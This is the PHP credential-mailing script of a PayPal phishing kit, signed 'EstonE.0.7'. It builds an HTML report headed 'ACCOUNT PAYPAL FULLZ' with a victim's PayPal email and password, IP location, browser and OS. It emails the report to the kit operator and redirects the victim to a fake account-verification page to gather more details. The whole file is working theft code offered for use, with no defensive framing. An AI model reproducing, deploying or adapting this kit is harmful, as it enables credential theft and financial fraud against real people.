<?php

session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_browser.php');
$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>ACCOUNT PAYPAL FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [PP Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
<font style='color:#9c0000;'>℗</font> [PP Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>IP LOOKUP INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
<font style='color:#9c0000;'>✪</font> [State]	= <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY EstonE.0.7</font> #####################
</div></html>\n";

        $Z118_SUBJECT = "NEW BB XD ✪ LOGIN INFO FROM : ".$_SESSION['_forlogin_']." ✪ ".$_POST['login_email']." ✪";
        $Z118_HEADERS .= "From:EstonE.0.7 <noreply@logs.com>";
        $Z118_HEADERS .= $_POST['eMailAdd']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
       
        @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
		HEADER("Location: ../settings/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>